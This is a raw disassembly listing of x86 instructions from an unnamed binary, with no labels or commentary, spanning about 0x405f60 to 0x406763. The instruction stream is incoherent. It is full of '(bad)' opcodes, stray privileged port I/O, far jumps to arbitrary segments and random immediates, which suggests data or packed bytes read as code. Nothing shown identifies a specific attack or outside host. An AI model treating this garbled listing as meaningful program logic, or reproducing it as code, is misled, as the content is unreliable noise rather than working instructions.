  405f60:	xchg   esp,eax
  405f61:	xor    ebx,DWORD PTR [edx+ebp*8]
  405f64:	fidivr DWORD PTR [ecx]
  405f66:	outs   dx,DWORD PTR ds:[esi]
  405f67:	mov    fs,WORD PTR [edx-0x67f279ef]
  405f6d:	mov    al,ds:0x1c586745
  405f72:	rcl    esi,1
  405f74:	data16 loope 0x405f60
  405f77:	imul   edx,DWORD PTR [esi],0x4a
  405f7a:	adc    eax,0xaf85b039
  405f7f:	xchg   esp,eax
  405f80:	mov    esp,0xf0a6cde9
  405f85:	mov    ecx,edi
  405f87:	xchg   edx,eax
  405f88:	lock pop ebp
  405f8a:	out    dx,eax
  405f8b:	push   edi
  405f8c:	jns    0x405fa0
  405f8e:	or     al,0x61
  405f90:	push   edx
  405f91:	pop    es
  405f92:	(bad)  
  405f93:	je     0x405fb4
  405f95:	lock and BYTE PTR [eax+0x26],0xc
  405f9a:	inc    ebp
  405f9b:	and    al,0x8c
  405f9d:	daa    
  405f9e:	jl     0x405f93
  405fa0:	sub    eax,0xeb8b5b88
  405fa5:	imul   edx,DWORD PTR [esi-0x6a],0x7b
  405fa9:	mov    ds:0x4edd12f8,al
  405fae:	mov    bh,0x8a
  405fb0:	es add eax,0x2964c28
  405fb6:	mov    ecx,0x7c6df5d
  405fbb:	inc    ebx
  405fbc:	lds    ebx,FWORD PTR [edx]
  405fbe:	or     eax,0xaef84912
  405fc3:	in     eax,dx
  405fc4:	mov    eax,0xeed6fedb
  405fc9:	imul   ecx,DWORD PTR [edi+0x40d68865],0xb9d2951
  405fd3:	test   eax,0xe4429f44
  405fd8:	repnz mov ch,0xda
  405fdb:	int    0x7c
  405fdd:	xchg   ebp,eax
  405fde:	mov    ah,0xfc
  405fe0:	mov    ah,0x2a
  405fe2:	adc    BYTE PTR [ebx],al
  405fe4:	mov    esi,0x9fbc638d
  405fe9:	inc    ebx
  405fea:	je     0x405f9a
  405fec:	arpl   WORD PTR [edi],si
  405fee:	add    bl,BYTE PTR [esi+0x49644937]
  405ff4:	jge    0x405fe8
  405ff6:	es push ecx
  405ff8:	push   es
  405ff9:	add    BYTE PTR [esi-0x6faa0170],ch
  405fff:	loope  0x40603b
  406001:	xchg   ecx,eax
  406002:	xor    ah,bl
  406004:	(bad)  
  406005:	fcmovnb st,st(1)
  406007:	add    DWORD PTR [esi+0x2d6faa09],edx
  40600d:	sub    edi,esp
  40600f:	jmp    0x90154fc5
  406014:	(bad)  
  406015:	sub    al,0x76
  406017:	sbb    ecx,DWORD PTR [edi-0x424a6a94]
  40601d:	daa    
  40601e:	fwait
  40601f:	push   0xffffffec
  406021:	xchg   esp,eax
  406022:	scas   eax,DWORD PTR es:[edi]
  406023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406024:	or     BYTE PTR [eax],0x35
  406027:	mov    ds:0x740deb07,al
  40602c:	push   es
  40602d:	push   0x63a8a5b2
  406032:	outs   dx,DWORD PTR ds:[esi]
  406033:	mov    cl,0x19
  406035:	dec    esp
  406036:	ret    0x7544
  406039:	sbb    DWORD PTR [ebx-0x2c3b093d],edx
  40603f:	dec    esi
  406040:	inc    eax
  406041:	push   es
  406042:	sbb    dl,BYTE PTR [ebp-0x4cddd99f]
  406048:	xchg   al,ch
  40604a:	lock shr ch,1
  40604d:	lds    eax,FWORD PTR [ecx]
  40604f:	nop
  406050:	pop    ecx
  406051:	(bad)  
  406053:	inc    eax
  406054:	inc    edi
  406055:	call   0xab1f:0x402a8a88
  40605c:	ins    DWORD PTR es:[edi],dx
  40605d:	mov    al,ds:0x89b33c1
  406062:	sub    ah,BYTE PTR [edx+0x13ddfa37]
  406068:	cmp    eax,0x98db7842
  40606d:	les    ecx,FWORD PTR [ebx+0x67572477]
  406073:	mov    ecx,0x837a9a90
  406078:	in     al,0x39
  40607a:	daa    
  40607b:	xchg   dl,al
  40607d:	inc    ecx
  40607e:	aam    0x1d
  406080:	mov    esp,0xfd917b3a
  406085:	xor    BYTE PTR [edi+0x2b31eab8],al
  40608b:	stc    
  40608c:	jl     0x40606f
  40608e:	fiadd  DWORD PTR [edi+ecx*4]
  406091:	js     0x40606a
  406093:	test   al,0xe0
  406095:	shl    ebx,0x91
  406098:	jecxz  0x4060a2
  40609a:	inc    ecx
  40609b:	stos   DWORD PTR es:[edi],eax
  40609c:	(bad)  
  40609d:	sbb    BYTE PTR [edi-0x4c1a0017],ah
  4060a3:	(bad)  
  4060a4:	cdq    
  4060a5:	sti    
  4060a6:	mov    eax,0xd449fff1
  4060ab:	adc    esp,DWORD PTR es:[ebp-0x1db07ab1]
  4060b2:	mov    bl,0x3
  4060b4:	addr16 sub eax,0xe7963d3e
  4060ba:	in     al,0x94
  4060bc:	scas   eax,DWORD PTR es:[edi]
  4060bd:	cmp    BYTE PTR [ecx+0x3c],al
  4060c0:	push   esi
  4060c1:	mov    DWORD PTR [ecx],eax
  4060c3:	out    dx,eax
  4060c4:	out    0xff,eax
  4060c6:	jo     0x4060e3
  4060c8:	aas    
  4060c9:	ins    DWORD PTR es:[edi],dx
  4060ca:	stos   DWORD PTR es:[edi],eax
  4060cb:	xchg   edi,eax
  4060cc:	(bad)  
  4060cd:	jmp    0x406075
  4060cf:	int3   
  4060d0:	add    eax,DWORD PTR [ecx+0x3c76bc92]
  4060d6:	add    edi,DWORD PTR [edi+0x21]
  4060d9:	jmp    0x406143
  4060db:	int    0x48
  4060dd:	xchg   ebp,eax
  4060de:	pop    esi
  4060df:	inc    ebp
  4060e0:	or     BYTE PTR [ecx+0x2a],0x57
  4060e4:	loopne 0x40607a
  4060e6:	imul   ecx,DWORD PTR [ebp-0x74],0xffffffde
  4060ea:	cli    
  4060eb:	js     0x4060cc
  4060ed:	aaa    
  4060ee:	cmp    BYTE PTR [edx-0x79],bh
  4060f1:	std    
  4060f2:	mov    edx,0xedcc72b7
  4060f7:	or     DWORD PTR [ebx+ecx*4],esp
  4060fa:	dec    esi
  4060fb:	jmp    0x41b3:0x4bfb9430
  406102:	in     eax,0x7c
  406104:	inc    esi
  406105:	cmp    BYTE PTR [edx+0x6d],dl
  406108:	inc    esp
  406109:	jno    0x40616f
  40610b:	adc    al,0xd9
  40610d:	fistp  QWORD PTR [ecx-0x7f]
  406110:	adc    DWORD PTR [esi-0x47],ebp
  406113:	leave  
  406114:	sbb    cl,bl
  406116:	jae    0x4060a8
  406118:	sub    eax,0xad2740c1
  40611d:	sub    al,0x2d
  40611f:	push   0xffffff9f
  406121:	inc    esp
  406122:	inc    ebx
  406123:	out    0x8f,al
  406125:	scas   eax,DWORD PTR es:[edi]
  406126:	push   esi
  406127:	mov    al,ds:0xb377d8c
  40612c:	jge    0x406129
  40612e:	jmp    0x389a5783
  406133:	pop    ebx
  406134:	popa   
  406135:	dec    edx
  406136:	pop    edx
  406137:	aam    0x37
  406139:	imul   edi,DWORD PTR [ebp-0x37ceaed5],0x79
  406140:	shr    DWORD PTR [esi],cl
  406142:	sbb    eax,0x63512cb5
  406147:	sub    edi,DWORD PTR cs:[eax-0x21]
  40614b:	cs out dx,eax
  40614d:	int3   
  40614e:	fbstp  TBYTE PTR [edi]
  406150:	and    al,0x2f
  406152:	adc    al,0xe0
  406154:	xor    ah,BYTE PTR [ecx-0x3961065b]
  40615a:	mov    al,ds:0x94c0abdb
  40615f:	lea    ebx,[ecx+0x6587b18a]
  406165:	xchg   BYTE PTR [eax],al
  406167:	in     eax,dx
  406168:	pop    es
  406169:	ds push es
  40616b:	push   es
  40616c:	jae    0x4060ff
  40616e:	sar    BYTE PTR [edx],1
  406170:	cmp    bl,0xb1
  406173:	lods   eax,DWORD PTR ds:[esi]
  406174:	idiv   DWORD PTR [ecx+0x68]
  406177:	fmul   DWORD PTR [ecx-0x6c]
  40617a:	lods   eax,DWORD PTR ss:[esi]
  40617c:	dec    ebx
  40617d:	sub    ah,BYTE PTR [edi-0x1da30f91]
  406183:	push   ebp
  406184:	jg     0x4061cb
  406186:	pop    bp
  406188:	ror    DWORD PTR [ecx+0x40489f59],cl
  40618e:	dec    ecx
  40618f:	inc    ebx
  406190:	imul   edx,ebp,0xfffffff9
  406193:	loope  0x40612f
  406195:	popf   
  406196:	sbb    ah,BYTE PTR [ecx]
  406198:	aam    0x21
  40619a:	aaa    
  40619b:	adc    eax,0x38988af6
  4061a0:	in     eax,0x30
  4061a2:	add    DWORD PTR [edi],edi
  4061a4:	stc    
  4061a5:	fsubp  st(4),st
  4061a7:	sbb    eax,esi
  4061a9:	xor    bh,BYTE PTR [edi+ebx*8]
  4061ac:	mov    eax,ds:0x1784be6
  4061b1:	pop    ebp
  4061b2:	push   0x629fdd66
  4061b7:	push   esi
  4061b8:	and    DWORD PTR [esi-0x6c],edx
  4061bb:	imul   BYTE PTR [esi+0x4a87e774]
  4061c1:	paddusb mm5,QWORD PTR [ecx-0xd4d554]
  4061c8:	sbb    ch,BYTE PTR [ebx-0x2d]
  4061cb:	push   0xffffffbf
  4061cd:	out    0xc3,eax
  4061cf:	sbb    eax,0xa6273301
  4061d4:	frstor [ebx-0x1c0dbb99]
  4061da:	cmc    
  4061db:	cmc    
  4061dc:	cmp    DWORD PTR [eax-0x10],0xbbfbffd
  4061e3:	sub    DWORD PTR [eax+edx*2-0x5],0x33f6a71c
  4061eb:	and    al,0x76
  4061ed:	xchg   DWORD PTR [edx+0x26d2e5d9],edx
  4061f3:	mov    eax,0x438a50d8
  4061f8:	ror    esp,cl
  4061fa:	(bad)  
  4061fb:	stos   BYTE PTR es:[edi],al
  4061fc:	fs test eax,0xf344afa0
  406202:	in     al,dx
  406203:	xchg   ecx,eax
  406204:	jmp    0x33cc632f
  406209:	mov    al,ds:0xafa960f7
  40620e:	nop
  40620f:	xor    ch,0x2c
  406212:	in     eax,0xd2
  406214:	ret    0xee94
  406217:	(bad)  
  406218:	loope  0x406257
  40621a:	ins    BYTE PTR es:[edi],dx
  40621b:	push   ecx
  40621c:	push   ss
  40621d:	mov    ch,0xc
  40621f:	jne    0x40627c
  406221:	mov    bh,0x40
  406223:	int3   
  406224:	xchg   ecx,eax
  406225:	add    cl,BYTE PTR [edi]
  406227:	mov    al,0x99
  406229:	rcl    DWORD PTR [edx],cl
  40622b:	jp     0x40628e
  40622d:	stos   DWORD PTR es:[edi],eax
  40622e:	aas    
  40622f:	jmp    0xac04ae14
  406234:	sub    bh,BYTE PTR [edi+0x5f358d8e]
  40623a:	xor    ebp,edi
  40623c:	out    0xc,eax
  40623e:	mov    esi,0x9550348c
  406243:	add    eax,0xc68f388f
  406248:	xchg   edi,eax
  406249:	dec    esi
  40624a:	test   DWORD PTR [esi+0xf],eax
  40624d:	push   eax
  40624e:	add    ebp,ecx
  406250:	and    edi,DWORD PTR [esi+eiz*4-0x33975402]
  406257:	mov    ebp,0x93c725b9
  40625c:	and    al,0xcb
  40625e:	test   BYTE PTR [edx-0x134a196d],cl
  406264:	pop    edx
  406265:	sub    BYTE PTR [ebx],bl
  406267:	xor    eax,0x8043238f
  40626c:	add    eax,0xc3ae9d3d
  406271:	into   
  406272:	(bad)  
  406273:	adc    eax,0x8a65d2dd
  406278:	lods   eax,DWORD PTR ds:[esi]
  406279:	and    dl,BYTE PTR [eax-0x58a1b873]
  40627f:	nop
  406280:	sub    BYTE PTR [ecx-0x1b4dfdf1],al
  406286:	cld    
  406287:	xor    bh,dh
  406289:	or     eax,0x43f80aa
  40628e:	pop    esi
  40628f:	fdiv   QWORD PTR [eax-0x9]
  406292:	mov    WORD PTR [eax-0x3d],?
  406295:	mov    DWORD PTR [ebp+0x50],edx
  406298:	imul   ebx,DWORD PTR [esi],0x26
  40629b:	jge    0x406257
  40629d:	xchg   esi,eax
  40629e:	jmp    0x40625b
  4062a0:	je     0x4062f2
  4062a2:	es gs jbe 0x4062a1
  4062a6:	test   BYTE PTR [edi],bl
  4062a8:	call   0x93d15396
  4062ad:	mov    eax,0x41240ddf
  4062b2:	es fwait
  4062b4:	sbb    BYTE PTR [edx],0x14
  4062b7:	leave  
  4062b8:	jg     0x406263
  4062ba:	fwait
  4062bb:	cmp    edx,ebx
  4062bd:	mov    al,0xa
  4062bf:	or     BYTE PTR [ecx],ah
  4062c1:	sahf   
  4062c2:	jge    0x40632b
  4062c4:	ret    
  4062c5:	xchg   esi,eax
  4062c6:	jns    0x40632f
  4062c8:	arpl   WORD PTR [edi+0x34],bx
  4062cb:	clc    
  4062cc:	and    DWORD PTR [edx],0xb7a25d29
  4062d2:	adc    eax,0x85c095db
  4062d7:	xor    BYTE PTR [eax+eax*1],ch
  4062da:	adc    edx,eax
  4062dc:	data16 jmp 0x4062cd
  4062df:	popa   
  4062e0:	sub    bl,BYTE PTR [ebx+esi*2+0x56d61847]
  4062e7:	xchg   ebx,eax
  4062e8:	cmp    al,cl
  4062ea:	xlat   BYTE PTR ds:[ebx]
  4062eb:	popa   
  4062ec:	xor    eax,0xe25f42a5
  4062f1:	outs   dx,DWORD PTR ds:[esi]
  4062f2:	mov    edx,0x3ef24a77
  4062f7:	icebp  
  4062f8:	jle    0x40634f
  4062fa:	mov    bh,0xb5
  4062fc:	dec    ebp
  4062fd:	xchg   ecx,esi
  4062ff:	or     DWORD PTR [edx+ecx*1],ebx
  406302:	jbe    0x40633a
  406304:	sub    DWORD PTR [edi-0x1c86d83b],ebx
  40630a:	sub    DWORD PTR [eax],0xffffff90
  40630d:	(bad)  
  40630e:	(bad)  
  40630f:	fist   DWORD PTR [edi+0x29]
  406312:	dec    eax
  406313:	mov    eax,ds:0x1655029e
  406318:	mov    ah,BYTE PTR [esi]
  40631a:	sbb    bl,BYTE PTR [edx]
  40631c:	push   0x4bf0708c
  406321:	nop
  406322:	or     eax,DWORD PTR [eax]
  406324:	(bad)  
  406325:	jo     0x40639f
  406327:	mov    bl,dl
  406329:	or     BYTE PTR [ecx-0x5ce586b],ch
  40632f:	lock je 0x406394
  406332:	xor    eax,esp
  406334:	mov    bl,0x7e
  406336:	rol    DWORD PTR [eax-0x26ae4f5],0x8b
  40633d:	sbb    DWORD PTR [eax+0x46aa0e1f],edx
  406343:	and    BYTE PTR [edx+eiz*1+0x648e5514],bh
  40634a:	daa    
  40634b:	mov    ah,0x93
  40634d:	cs adc edi,0x31
  406351:	jbe    0x406302
  406353:	ficomp WORD PTR [ecx-0x6c]
  406356:	or     al,0xac
  406358:	and    al,0xa7
  40635a:	pop    ecx
  40635b:	push   es
  40635c:	push   esp
  40635d:	in     eax,dx
  40635e:	mov    cl,0xd4
  406360:	mov    ebx,0x16940cac
  406365:	lds    ecx,FWORD PTR [edx+0x5353d5f8]
  40636b:	lods   eax,DWORD PTR ds:[esi]
  40636c:	lahf   
  40636d:	sub    al,0x28
  40636f:	(bad)  
  406370:	jno    0x406373
  406372:	jp     0x406356
  406374:	addr16 xor esp,eax
  406377:	mov    edi,0x788800a
  40637c:	out    dx,eax
  40637d:	dec    edx
  40637e:	mov    dl,0xdc
  406380:	cmp    ah,ch
  406382:	out    0x7a,eax
  406384:	in     al,dx
  406385:	sahf   
  406386:	fbld   TBYTE PTR [esi+ebx*4+0x1e]
  40638a:	stc    
  40638b:	and    BYTE PTR [ebp+0x1d6e7b21],bl
  406391:	aas    
  406392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406393:	lods   al,BYTE PTR ds:[esi]
  406394:	gs add esp,edi
  406397:	pop    ebp
  406398:	iret   
  406399:	pusha  
  40639a:	mov    bl,0xe4
  40639c:	xchg   esi,eax
  40639d:	(bad)  
  40639e:	loope  0x4063fd
  4063a0:	mov    eax,0x140f0d7
  4063a5:	pop    ebp
  4063a6:	sub    eax,0xf4deed80
  4063ab:	das    
  4063ac:	mov    cl,0xa8
  4063ae:	std    
  4063af:	call   0x13ad:0xc7ba0fa7
  4063b6:	xchg   ecx,eax
  4063b7:	in     eax,0x3
  4063b9:	(bad)  
  4063ba:	enter  0x40f4,0x2
  4063be:	push   edx
  4063bf:	mov    bl,cl
  4063c1:	push   ebx
  4063c2:	push   eax
  4063c3:	xor    al,0x5d
  4063c5:	mov    esp,0x93af68a6
  4063ca:	jb     0x4063b6
  4063cc:	inc    edx
  4063cd:	push   0x991a4fe7
  4063d2:	sub    bl,BYTE PTR [edi-0x7225d0ca]
  4063d8:	lahf   
  4063d9:	std    
  4063da:	add    al,0x57
  4063dc:	imul   esp,DWORD PTR [esi],0x5f
  4063df:	mov    ch,0xec
  4063e1:	jns    0x4063c5
  4063e3:	imul   DWORD PTR [eax]
  4063e5:	jns    0x40644c
  4063e7:	mov    ecx,es
  4063e9:	fiadd  DWORD PTR [edi-0x5c]
  4063ec:	scas   eax,DWORD PTR es:[edi]
  4063ed:	inc    eax
  4063ee:	and    bh,cl
  4063f0:	cmp    eax,0xcad97a87
  4063f5:	arpl   WORD PTR ss:[ecx-0x46af82de],si
  4063fc:	sbb    al,0xee
  4063fe:	mov    bl,BYTE PTR [eax-0xf0ac87b]
  406404:	imul   esp,edi,0x31
  406407:	pushf  
  406408:	hlt    
  406409:	xor    ecx,DWORD PTR [esi-0x6c]
  40640c:	rol    BYTE PTR [ebx-0x2],1
  40640f:	mov    ebp,DWORD PTR [ebx+0x75]
  406412:	test   BYTE PTR [edx+0x361d54e3],al
  406418:	mov    DWORD PTR [esi-0x2b],ebp
  40641b:	inc    esi
  40641c:	icebp  
  40641d:	cmp    esi,eax
  40641f:	jmp    0x406446
  406421:	(bad)  [ebx-0x67d092ec]
  406427:	call   0xe3876b24
  40642c:	ins    DWORD PTR es:[edi],dx
  40642d:	iret   
  40642e:	bound  ecx,QWORD PTR [ebp-0x4ea63b73]
  406434:	push   es
  406435:	pop    esi
  406436:	hlt    
  406437:	enter  0xb49c,0x25
  40643b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40643c:	int3   
  40643d:	pop    ecx
  40643e:	sar    BYTE PTR [edx+0x2f],0xca
  406442:	jg     0x406464
  406444:	pushf  
  406445:	adc    BYTE PTR [eax-0x6358dbe9],cl
  40644b:	rcl    DWORD PTR [edi-0x7],cl
  40644e:	xor    eax,0xf5e6ffc7
  406453:	int    0x90
  406455:	push   esi
  406456:	pop    eax
  406457:	std    
  406458:	jb     0x40645f
  40645a:	sub    al,0x18
  40645c:	dec    edi
  40645d:	cmp    al,0x7f
  40645f:	sub    al,0x99
  406461:	mov    BYTE PTR [ecx],dh
  406463:	add    al,0x64
  406465:	push   edi
  406466:	fisttp QWORD PTR [ecx]
  406468:	cwde   
  406469:	inc    ebp
  40646a:	or     esp,DWORD PTR [ebx]
  40646c:	jl     0x4064b7
  40646e:	xor    edx,DWORD PTR [ecx+0x107fe4e6]
  406474:	pxor   mm5,QWORD PTR [esi-0x22]
  406478:	pop    ebp
  406479:	fisub  DWORD PTR [esi+0x24]
  40647c:	add    al,cl
  40647e:	std    
  40647f:	stos   BYTE PTR es:[edi],al
  406480:	fld    TBYTE PTR [ecx]
  406482:	call   0xa9d61045
  406487:	add    eax,DWORD PTR [ebx+0x34]
  40648a:	jae    0x406436
  40648c:	call   0x8e1c:0xe2fde197
  406493:	mov    eax,ds:0x1bccc02c
  406498:	jecxz  0x40642b
  40649a:	or     eax,0x66c3a529
  40649f:	(bad)  
  4064a0:	mul    DWORD PTR [ebx+0x40]
  4064a3:	xchg   ecx,eax
  4064a4:	adc    al,0x4d
  4064a6:	cld    
  4064a7:	in     al,0x4d
  4064a9:	dec    edx
  4064aa:	mov    ecx,0xc04d8f62
  4064af:	jmp    FWORD PTR ds:0x1101336f
  4064b5:	add    DWORD PTR [esi-0x7f5216c9],ebx
  4064bb:	and    eax,0xa63d1f55
  4064c0:	jb     0x406489
  4064c2:	sub    ebp,DWORD PTR [ecx+edx*8+0x624fe0fb]
  4064c9:	lea    ebp,[eax-0x3daa2949]
  4064cf:	cmc    
  4064d0:	ss push 0xc9b7cc1f
  4064d6:	sbb    ebp,edi
  4064d8:	out    0x29,eax
  4064da:	add    BYTE PTR [esi-0x6e],bl
  4064dd:	pop    ebx
  4064de:	jge    0x4064b7
  4064e0:	adc    eax,0xe65bfe8c
  4064e5:	xlat   BYTE PTR ds:[ebx]
  4064e6:	xchg   DWORD PTR [esi],esi
  4064e8:	jne    0x4064dc
  4064ea:	lods   al,BYTE PTR ds:[esi]
  4064eb:	jmp    0x406483
  4064ed:	ret    0x8968
  4064f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064f1:	jbe    0x40647b
  4064f3:	push   eax
  4064f4:	push   cs
  4064f5:	fldcw  WORD PTR [edi-0x15]
  4064f8:	or     esi,DWORD PTR [ebx+0x29]
  4064fb:	mov    eax,ds:0x5896b033
  406500:	inc    ecx
  406501:	adc    BYTE PTR [ebp+0x72],al
  406504:	(bad)  
  406505:	jae    0x406583
  406507:	xchg   esp,eax
  406508:	pop    edi
  406509:	jo     0x40649f
  40650b:	test   DWORD PTR [edi+0x65],ebx
  40650e:	cmp    eax,0x9b0968d6
  406513:	xor    eax,0xa02634b4
  406518:	adc    BYTE PTR [edx+0x75803685],0x6e
  40651f:	xchg   edx,eax
  406520:	aas    
  406521:	sub    dl,dh
  406523:	and    eax,0x2c4d53a6
  406528:	jl     0x40653c
  40652a:	jmp    0x40655c
  40652c:	jmp    0x9d3ba44e
  406531:	ja     0x4064f1
  406533:	les    edx,FWORD PTR [ecx+0x2d]
  406536:	xchg   esp,eax
  406537:	clc    
  406538:	addr16 push eax
  40653a:	mov    eax,ds:0xd18c4c8c
  40653f:	stc    
  406540:	icebp  
  406541:	mov    eax,0x9869bf9e
  406546:	jmp    0x406563
  406548:	jg     0x40658c
  40654a:	test   al,0x91
  40654c:	sbb    BYTE PTR [edx-0x28],dh
  40654f:	xchg   ebp,eax
  406550:	aaa    
  406551:	adc    ecx,esp
  406553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406554:	aaa    
  406555:	iret   
  406556:	call   FWORD PTR ds:0xa90130b
  40655c:	aam    0x11
  40655e:	aas    
  40655f:	rol    DWORD PTR ds:0xd1e46147,0x5d
  406566:	xchg   ebp,eax
  406567:	inc    esi
  406568:	adc    al,0xdf
  40656a:	outs   dx,BYTE PTR ds:[esi]
  40656b:	mov    edi,0x50c8a4fb
  406570:	cld    
  406571:	retf   0x861c
  406574:	clc    
  406575:	dec    ebx
  406576:	pop    bp
  406578:	pusha  
  406579:	or     eax,DWORD PTR [eax-0x36d9c0]
  40657f:	ret    
  406580:	ret    0x8483
  406583:	into   
  406584:	cld    
  406585:	(bad)  
  406586:	lods   al,BYTE PTR ds:[esi]
  406587:	xor    eax,0x155c8d0d
  40658c:	dec    ecx
  40658d:	xchg   esp,eax
  40658e:	popa   
  40658f:	adc    bl,bl
  406591:	addr16 fs sbb eax,0x6694f740
  406598:	jns    0x406573
  40659a:	imul   esi,DWORD PTR [edx+ebp*4+0x5e526eba],0x639aa34b
  4065a5:	xchg   ebx,eax
  4065a6:	pop    ebx
  4065a7:	outs   dx,BYTE PTR ds:[esi]
  4065a8:	dec    ecx
  4065a9:	dec    edx
  4065aa:	xor    BYTE PTR [ebp+0x37],ch
  4065ad:	push   0x1464b21b
  4065b2:	push   0xffffff91
  4065b4:	daa    
  4065b5:	stos   BYTE PTR es:[edi],al
  4065b6:	push   ebp
  4065b7:	imul   esp,DWORD PTR [esi+0x1a4d3464],0x9566db31
  4065c1:	dec    edi
  4065c2:	or     cl,BYTE PTR [ecx]
  4065c4:	inc    ecx
  4065c5:	inc    esi
  4065c6:	dec    edx
  4065c7:	or     BYTE PTR [edi],bl
  4065c9:	out    0x33,eax
  4065cb:	mov    bl,0xba
  4065cd:	dec    ecx
  4065ce:	loopne 0x40659b
  4065d0:	pop    esi
  4065d1:	dec    eax
  4065d2:	xchg   edx,ecx
  4065d4:	cwde   
  4065d5:	pop    ebp
  4065d6:	mov    esi,0xbf14f5be
  4065db:	and    eax,0x945a739c
  4065e0:	dec    edx
  4065e1:	fwait
  4065e2:	and    DWORD PTR [ecx+0x73],edx
  4065e5:	pop    es
  4065e6:	jnp    0x406659
  4065e8:	mov    al,ds:0x74a72dbb
  4065ed:	jg     0x406642
  4065ef:	jecxz  0x406659
  4065f1:	mov    ds:0x3e746c4f,eax
  4065f6:	(bad)  
  4065f7:	(bad)
  4065fb:	pop    esi
  4065fc:	dec    ecx
  4065fd:	cmp    BYTE PTR [eax-0x6],0xbc
  406601:	lahf   
  406602:	sbb    BYTE PTR [esi-0x47],0x39
  406606:	popa   
  406607:	leave  
  406608:	add    eax,0xb518f84f
  40660d:	jb     0x4065e1
  40660f:	xchg   edi,eax
  406610:	shl    DWORD PTR [esi],1
  406612:	fbstp  TBYTE PTR ds:0xde5b54b2
  406618:	(bad)  
  406619:	imul   esi,DWORD PTR [ebx-0x4d0065c7],0x13
  406620:	retf   0xc4a4
  406623:	pop    edi
  406624:	rcl    BYTE PTR [edx+0x5192ae08],cl
  40662a:	and    DWORD PTR [edx+0x2],esi
  40662d:	aas    
  40662e:	out    0x8d,al
  406630:	into   
  406631:	mov    bh,0xa4
  406633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406634:	jle    0x406683
  406636:	les    ecx,FWORD PTR [ecx+0x230cec22]
  40663c:	pop    edx
  40663d:	in     eax,dx
  40663e:	and    BYTE PTR [eax+0x8],cl
  406641:	aas    
  406642:	pop    es
  406643:	pop    edi
  406644:	pop    ds
  406645:	into   
  406646:	enter  0x3754,0xc9
  40664a:	xchg   ecx,eax
  40664b:	out    0x7b,al
  40664d:	xor    eax,0x9481a201
  406652:	mov    BYTE PTR [ebx],bh
  406654:	and    edi,DWORD PTR [ebp-0x41]
  406657:	inc    ebx
  406658:	fadd   QWORD PTR [eax+0x2d]
  40665b:	shr    ecx,1
  40665d:	shl    DWORD PTR [eax],cl
  40665f:	es int 0x28
  406662:	cmp    al,0xff
  406664:	test   BYTE PTR [edx],ch
  406666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406667:	sub    dl,ch
  406669:	les    ecx,FWORD PTR [edx]
  40666b:	in     al,dx
  40666c:	push   cs
  40666d:	das    
  40666e:	mov    WORD PTR [edi],?
  406670:	cld    
  406671:	add    al,0xf3
  406673:	mov    ah,0x63
  406675:	out    0xb5,eax
  406677:	add    eax,0x5436f70b
  40667c:	add    ecx,DWORD PTR [eax-0x2fa7bef2]
  406682:	mov    ebp,0xe6c09a66
  406687:	cld    
  406688:	sub    eax,0x72f08025
  40668d:	sti    
  40668e:	inc    edi
  40668f:	add    dl,BYTE PTR [esi]
  406691:	out    0x31,eax
  406693:	scas   al,BYTE PTR es:[edi]
  406694:	inc    edi
  406695:	(bad)  
  406696:	arpl   WORD PTR [ebp+0xa],sp
  406699:	in     eax,dx
  40669a:	inc    edx
  40669b:	dec    esi
  40669c:	out    dx,al
  40669d:	scas   eax,DWORD PTR es:[edi]
  40669e:	jno    0x4066ee
  4066a0:	adc    al,0xd3
  4066a2:	leave  
  4066a3:	push   edi
  4066a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066a5:	xchg   edi,eax
  4066a6:	retf   0x65bc
  4066a9:	mov    ebx,0x3adfe9ec
  4066ae:	jae    0x40663e
  4066b0:	dec    esp
  4066b1:	leave  
  4066b2:	or     al,0xc
  4066b4:	jnp    0x406711
  4066b6:	and    DWORD PTR [edx],esp
  4066b8:	inc    edx
  4066b9:	jecxz  0x40667a
  4066bb:	shl    BYTE PTR [ecx],1
  4066bd:	bound  ebp,QWORD PTR [ebx]
  4066bf:	hlt    
  4066c0:	add    eax,0xb458919a
  4066c5:	addr16 sub eax,0x1b3a3a88
  4066cb:	mov    cl,0x23
  4066cd:	aam    0x7c
  4066cf:	mov    ds:0xe4800150,al
  4066d4:	imul   edi,DWORD PTR [edi-0x22],0xffffff98
  4066d8:	ins    DWORD PTR es:[edi],dx
  4066d9:	cmp    edi,DWORD PTR [ecx+0x399377c8]
  4066df:	or     DWORD PTR [ebp-0x6c],esp
  4066e2:	push   ds
  4066e3:	mov    ds:0xc9a5207e,al
  4066e8:	sbb    BYTE PTR [edx+0x505b4574],0xda
  4066ef:	pop    ebp
  4066f0:	in     al,dx
  4066f1:	sbb    eax,0xc51c663e
  4066f6:	out    dx,al
  4066f7:	in     al,dx
  4066f8:	adc    ah,BYTE PTR [edi-0x27]
  4066fb:	mov    ah,0x28
  4066fd:	ins    DWORD PTR es:[edi],dx
  4066fe:	jmp    0xd452:0xad33ab8d
  406705:	mov    eax,ds:0x5646926f
  40670a:	inc    ecx
  40670b:	xchg   esi,eax
  40670c:	jecxz  0x40672c
  40670e:	fldcw  WORD PTR [esi]
  406710:	sbb    DWORD PTR ds:0x2c97,0xf84526bc
  406719:	cmc    
  40671a:	inc    ecx
  40671b:	fidivr WORD PTR [ebx-0x1b]
  40671e:	std    
  40671f:	cmp    BYTE PTR [ebp-0x18],dh
  406722:	inc    ebp
  406723:	mov    edx,0x7cdae50
  406728:	ja     0x4066d8
  40672a:	hlt    
  40672b:	mov    ecx,0x90f08f1d
  406730:	lahf   
  406731:	test   eax,0xe1c69a06
  406736:	sub    bh,dh
  406738:	and    eax,0x95231502
  40673d:	jae    0x406703
  40673f:	sub    DWORD PTR [ebp+eax*4-0x49],esi
  406743:	hlt    
  406744:	sbb    al,0x9c
  406746:	and    DWORD PTR [ebx+edx*4+0x2341a83e],ecx
  40674d:	lods   al,BYTE PTR ds:[esi]
  40674e:	retf   0x3f4b
  406751:	and    DWORD PTR [edx-0x78],esp
  406754:	ja     0x406708
  406756:	add    edx,DWORD PTR [eax+0x66]
  406759:	mov    ?,WORD PTR gs:[ecx+0x6]
  40675d:	in     al,0x85
  40675f:	adc    bh,BYTE PTR [edi+eiz*8-0x11]
  406763:	sbb    DWORD PTR [edi+0x3b4b1470],0xffffffc1
